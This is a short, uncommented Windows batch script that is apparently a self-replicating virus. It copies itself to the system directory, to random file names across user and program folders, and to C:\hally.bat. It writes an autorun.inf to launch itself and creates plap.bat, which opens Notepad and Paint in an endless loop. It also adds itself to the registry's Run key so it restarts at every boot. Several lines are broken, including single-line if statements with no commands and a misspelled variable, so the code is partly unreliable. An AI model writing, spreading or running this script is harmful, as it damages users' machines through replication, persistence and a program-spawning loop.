   @echo off
   copy %0 c:\hally.bat
   if exist c:\autorun.inf
   exit
   if not exist c:\autorun.inf
   echo [autorun] >> c:\autorun.inf
   echo open plap.bat >> c:\autorun.inf
   echo open hally.bat >> c:\autorun.inf
   goto makeplap

   :makeplap
   echo :lookyloopy >> c:\plap.bat
   echo start notepad >> c:\plap.bat
   echo start mspaint >> c:\plap.bat
   echo goto lookyloopy >> c:\plap.bat
   goto makemyself

   :makemyself
   copy %0 %SystemRoot%\MSDOS_3.bat

   :chekexist
   if exist c:\hally.bat
   exit
   if not exist c:\hally.bat
   copy %0 c:\hally.bat
   goto randomnames

   :randomnames
   copy %0 %SystemRoot%\%random%.bat
   copy %0 %Windir%\%random%.bat
   copy %0 %programfilesdir%\%random%\%random%.bat
   copy %0 %homepath%\%random%\%random%.bat
   copy %0 %homepaht%\%random%.bat
   goto startup

   :startup
   echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> %programfilesdir%\any.reg
   echo "MSDOS Shell"="c:\hally.bat" >> c:\any.reg
   start regedit /s %programfilesdir%\any.reg
   exit
